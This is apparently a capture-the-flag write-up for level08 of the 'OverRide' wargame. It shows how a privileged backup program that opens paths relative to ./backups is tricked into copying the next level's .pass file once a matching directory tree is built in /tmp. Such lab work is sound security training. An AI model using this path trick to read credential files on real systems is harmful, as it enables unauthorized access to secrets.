This level is a bit different! We don't really need to look at the source code, because of the programs behaviour. Let's take a closer look:

```shell
$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

The program tries to open the file we pass as an argument and it's a relative path, which leads to the error. This is easily fixable by simply creating that path. However as we don't have write permissions in the home directory we need to do so in the `tmp` folder.

```shell
level08@OverRide:/tmp$ mkdir home
level08@OverRide:/tmp$ cd home
level08@OverRide:/tmp/home$ mkdir users
level08@OverRide:/tmp/home$ cd users
level08@OverRide:/tmp/home/users$ mkdir level09
```

Now we should be able to run it from here.

```shell
level08@OverRide:/tmp$ ~/level08 ../home/users/level09/.pass
level08@OverRide:/tmp$ ls
backups  hello  home  level09
level08@OverRide:/tmp$ cd home/users/level09
level08@OverRide:/tmp/home/users/level09$ ls -llah

Tada, there's our password!
